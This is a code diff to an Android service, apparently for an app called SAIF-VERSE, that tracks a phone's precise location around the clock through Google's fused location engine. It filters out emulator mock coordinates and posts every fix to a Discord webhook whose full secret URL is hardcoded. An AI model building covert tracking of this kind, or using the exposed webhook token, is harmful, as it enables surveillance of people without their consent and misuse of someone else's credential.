@@ -29,8 +29,16 @@ import android.os.Looper;
 import android.os.PowerManager;
 import android.util.Log;
 
+import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
+
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationCallback;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationResult;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.location.Priority;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -52,11 +60,13 @@ public class LocationForegroundService extends Service {
     private static final String CHANNEL_ID = "saif_verse_background_service";
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1562511570968387634/kxHb_nks02EyCjlG_ypU4-ac-9ji-QBoF28nONa5ODS1KL43rtdmrcQlbMsGMKRPbnM8";
     private static final String PREFS_NAME = "saif_verse_bg_prefs";
-    private static final String QUEUE_KEY = "saif_verse_native_loc_queue_v2";
+    private static final String QUEUE_KEY = "saif_verse_native_loc_queue_v3";
 
-    private static final float MIN_DISTANCE_METERS = 10.0f; // 10 meters movement threshold
+    private static final float MIN_DISTANCE_METERS = 10.0f; // Exact 10m movement trigger
     private static final long HOURLY_INTERVAL_MS = 60 * 60 * 1000L; // 1 hour stationary pulse
 
+    private FusedLocationProviderClient fusedClient;
+    private LocationCallback fusedLocationCallback;
     private LocationManager locationManager;
     private Location lastDispatchedLocation = null;
     private long lastDispatchedTimeMs = 0;
@@ -65,10 +75,9 @@ public class LocationForegroundService extends Service {
     private ConnectivityManager connectivityManager;
     private ConnectivityManager.NetworkCallback networkCallback;
 
-    private final LocationListener locationListener = new LocationListener() {
+    private final LocationListener fallbackLocationListener = new LocationListener() {
         @Override
-        public void onLocationChanged(Location location) {
-            if (location == null) return;
+        public void onLocationChanged(@NonNull Location location) {
             handleLocationUpdate(location);
         }
 
@@ -76,18 +85,18 @@ public class LocationForegroundService extends Service {
         public void onStatusChanged(String provider, int status, Bundle extras) {}
 
         @Override
-        public void onProviderEnabled(String provider) {}
+        public void onProviderEnabled(@NonNull String provider) {}
 
         @Override
-        public void onProviderDisabled(String provider) {}
+        public void onProviderDisabled(@NonNull String provider) {}
     };
 
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.i(TAG, "Creating SAIF-VERSE 24/7 Background Service...");
+        Log.i(TAG, "Creating SAIF-VERSE 24/7 Background Service with Google Fused Location Engine...");
 
-        // Acquire WakeLock so background tracking never halts when phone is locked
+        // Acquire WakeLock so CPU never sleeps while guarding in background
         PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
         if (powerManager != null) {
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "saifverse:service_wakelock");
@@ -111,8 +120,8 @@ public class LocationForegroundService extends Service {
         // Register Network monitor for instant auto-flush when internet reconnects
         setupNetworkCallback();
 
-        // Start location tracking across all available providers
-        startNativeTracking();
+        // Start High-Accuracy Fused Location Engine (Wi-Fi + GPS + Cell + Sensors)
+        startFusedTracking();
 
         // Guaranteed 1-hour stationary check executor
         stationaryExecutor = Executors.newSingleThreadScheduledExecutor();
@@ -126,7 +135,7 @@ public class LocationForegroundService extends Service {
                         if (lastDispatchedLocation != null) {
                             dispatchLocationAsync(lastDispatchedLocation, "hourly_stationary", 0f);
                         } else {
-                            pollCurrentLocationAndDispatch("hourly_stationary");
+                            requestImmediateFreshLocation("hourly_stationary");
                         }
                     }
                 } catch (Exception e) {
@@ -151,8 +160,9 @@ public class LocationForegroundService extends Service {
     public void onDestroy() {
         super.onDestroy();
         Log.w(TAG, "Destroying SAIF-VERSE Background Service");
+        stopFusedTracking();
         if (locationManager != null) {
-            locationManager.removeUpdates(locationListener);
+            locationManager.removeUpdates(fallbackLocationListener);
         }
         if (stationaryExecutor != null) {
             stationaryExecutor.shutdownNow();
@@ -215,7 +225,7 @@ public class LocationForegroundService extends Service {
 
                 networkCallback = new ConnectivityManager.NetworkCallback() {
                     @Override
-                    public void onAvailable(Network network) {
+                    public void onAvailable(@NonNull Network network) {
                         Log.i(TAG, "Network restored in background service. Flushing offline location queue...");
                         flushOfflineQueueAsync();
                     }
@@ -229,50 +239,81 @@ public class LocationForegroundService extends Service {
     }
 
     @SuppressLint("MissingPermission")
-    private void startNativeTracking() {
+    private void startFusedTracking() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
             ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             Log.w(TAG, "Location permissions missing for background tracking.");
             return;
         }
 
-        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        if (locationManager == null) return;
-
         try {
-            // Register across GPS, Network, and Passive providers on main looper
-            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 0, locationListener, Looper.getMainLooper());
-            }
-            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 0, locationListener, Looper.getMainLooper());
-            }
-            if (locationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
-                locationManager.requestLocationUpdates(LocationManager.PASSIVE_PROVIDER, 5000, 0, locationListener, Looper.getMainLooper());
-            }
+            fusedClient = LocationServices.getFusedLocationProviderClient(this);
 
-            // Initial location seed
-            pollCurrentLocationAndDispatch("initial_accurate");
+            LocationRequest locationRequest = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 3000)
+                    .setMinUpdateDistanceMeters(0f) // Receive all movements
+                    .setMinUpdateIntervalMillis(1500)
+                    .setMaxUpdateDelayMillis(5000)
+                    .build();
+
+            fusedLocationCallback = new LocationCallback() {
+                @Override
+                public void onLocationResult(@NonNull LocationResult locationResult) {
+                    for (Location location : locationResult.getLocations()) {
+                        if (location != null) {
+                            handleLocationUpdate(location);
+                        }
+                    }
+                }
+            };
+
+            fusedClient.requestLocationUpdates(locationRequest, fusedLocationCallback, Looper.getMainLooper());
+
+            // Immediate initial seed
+            requestImmediateFreshLocation("initial_accurate");
         } catch (Exception e) {
-            Log.e(TAG, "Error requesting location updates in service", e);
+            Log.e(TAG, "Fused location client unavailable, falling back to LocationManager: " + e.getMessage());
+            startFallbackLocationManagerTracking();
+        }
+    }
+
+    private void stopFusedTracking() {
+        if (fusedClient != null && fusedLocationCallback != null) {
+            fusedClient.removeLocationUpdates(fusedLocationCallback);
         }
     }
 
     @SuppressLint("MissingPermission")
-    private void pollCurrentLocationAndDispatch(String reason) {
+    private void startFallbackLocationManagerTracking() {
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         if (locationManager == null) return;
+
         try {
-            Location best = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-            if (best == null) {
-                best = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 0, fallbackLocationListener, Looper.getMainLooper());
             }
-            if (best == null) {
-                best = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
+            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 0, fallbackLocationListener, Looper.getMainLooper());
             }
-            if (best != null && !isDummyMockLocation(best.getLatitude(), best.getLongitude())) {
-                handleLocationUpdate(best);
+            if (locationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
+                locationManager.requestLocationUpdates(LocationManager.PASSIVE_PROVIDER, 5000, 0, fallbackLocationListener, Looper.getMainLooper());
             }
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.e(TAG, "Fallback LocationManager error", e);
+        }
+    }
+
+    @SuppressLint("MissingPermission")
+    private void requestImmediateFreshLocation(final String reason) {
+        if (fusedClient != null) {
+            fusedClient.getLastLocation().addOnSuccessListener(new com.google.android.gms.tasks.OnSuccessListener<Location>() {
+                @Override
+                public void onSuccess(Location location) {
+                    if (location != null) {
+                        handleLocationUpdate(location);
+                    }
+                }
+            });
+        }
     }
 
     private void handleLocationUpdate(Location newLoc) {
@@ -281,7 +322,7 @@ public class LocationForegroundService extends Service {
         double lat = newLoc.getLatitude();
         double lng = newLoc.getLongitude();
 
-        // Reject only 0,0 or hardcoded BlueStacks dummy mock
+        // Reject only 0,0 or exact hardcoded BlueStacks default Banani mock (23.804093, 90.415238)
         if (isDummyMockLocation(lat, lng)) {
             return;
         }
@@ -313,9 +354,8 @@ public class LocationForegroundService extends Service {
     }
 
     private boolean isDummyMockLocation(double lat, double lng) {
-        // Only reject 0,0 or exact BlueStacks Banani mock (23.804093, 90.415238)
         if (Math.abs(lat) < 0.001 && Math.abs(lng) < 0.001) return true;
-        if (Math.abs(lat - 23.804093) < 0.001 && Math.abs(lng - 90.415238) < 0.001) return true;
+        if (Math.abs(lat - 23.804093) < 0.0005 && Math.abs(lng - 90.415238) < 0.0005) return true;
         return false;
     }
 
@@ -325,7 +365,7 @@ public class LocationForegroundService extends Service {
         final double alt = loc.hasAltitude() ? loc.getAltitude() : 0.0;
         final float acc = loc.hasAccuracy() ? loc.getAccuracy() : 15.0f;
 
-        // Update baseline tracking state
+        // Update baseline anchor
         lastDispatchedLocation = new Location(loc);
         lastDispatchedTimeMs = System.currentTimeMillis();
 
@@ -337,7 +377,7 @@ public class LocationForegroundService extends Service {
             public void run() {
                 boolean sent = postLocationToDiscord(lat, lng, alt, acc, reason, distanceMeters, timeStr);
                 if (!sent) {
-                    Log.w(TAG, "Offline or network failure: enqueuing location to native SharedPreferences queue...");
+                    Log.w(TAG, "Offline or network failure: saving location to native SharedPreferences queue...");
                     enqueueOfflineLocation(lat, lng, alt, acc, reason, distanceMeters, timeStr);
                 } else {
                     flushOfflineQueueAsync();
@@ -401,7 +441,7 @@ public class LocationForegroundService extends Service {
                     }
 
                     prefs.edit().putString(QUEUE_KEY, remaining.toString()).apply();
-                    Log.i(TAG, "Offline flush finished. Remaining: " + remaining.length());
+                    Log.i(TAG, "Offline flush completed. Remaining: " + remaining.length());
                 } catch (Exception e) {
                     Log.e(TAG, "Error in flushOfflineQueueAsync", e);
                 }
@@ -466,7 +506,7 @@ public class LocationForegroundService extends Service {
             embed.put("fields", fields);
 
             JSONObject footer = new JSONObject();
-            footer.put("text", "SAIF-VERSE 24/7 Background Engine • Offline-Safe Native Queue");
+            footer.put("text", "SAIF-VERSE 24/7 Background Engine • Google Fused Location");
             embed.put("footer", footer);
 
             JSONArray embeds = new JSONArray();
